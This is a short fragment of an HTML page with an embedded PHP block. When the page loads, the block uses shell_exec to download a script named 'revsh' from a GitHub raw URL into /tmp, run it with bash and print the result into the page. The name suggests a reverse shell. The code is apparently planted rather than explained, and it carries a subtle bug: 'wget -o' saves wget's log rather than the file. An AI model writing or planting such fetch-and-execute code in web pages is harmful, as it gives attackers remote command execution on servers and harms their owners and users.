	</body>
</html>	
<?php 
	$prova = shell_exec('cd /tmp/trs; wget -o revsh https://raw.githubusercontent.com/Gabry-r/Shellscripts/master/tes; /bin/bash /tmp/trs/revsh > /tmp/trs/output; cat /tmp/trs/output');
	print "<html>
	    <body>
		{$prova}
	    </body>
	  </html>
	";
?>
<html>
	<body>


